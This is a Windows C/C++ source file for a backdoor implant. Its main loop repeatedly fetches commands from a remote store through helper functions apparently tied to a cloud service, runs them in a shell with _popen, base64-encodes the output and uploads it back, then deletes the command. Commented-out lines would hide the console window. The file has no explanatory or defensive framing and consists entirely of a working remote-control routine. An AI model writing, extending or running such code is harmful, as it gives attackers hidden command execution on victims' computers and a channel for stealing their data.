#include <windows.h>
#include "MyString.h"
#include "CloudFunctions.h"
#include <stdio.h>

int Odd_Num() {
    int result = rand();
    if (result % 2 == 1)
        return result;
    else
        return result - 1;
}

int main() {
    //HWND h = GetConsoleWindow();
    //ShowWindow(h, 0);
    while (Odd_Num() % 2 != 0) {
        Sleep(5000);
        MyString data = downloadContext();
        if (data.getLength() > 0) {

            for (int i = 0; i < data.getLength(); i++) {
                if (data.getCharAt(i) == '\n') {
                    data.setCharAt(i, '&');
                }
            }
            FILE* file = _popen(data.getContext(), "r");
            MyString output = "";
            char temp_buffer[1024];
            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
                output = output + temp_buffer;
            }
            //output = encoder(output, 1);
            output = converter_64(output);
            upload(output);
            deleteContext();

        }
    }
    return 0;
}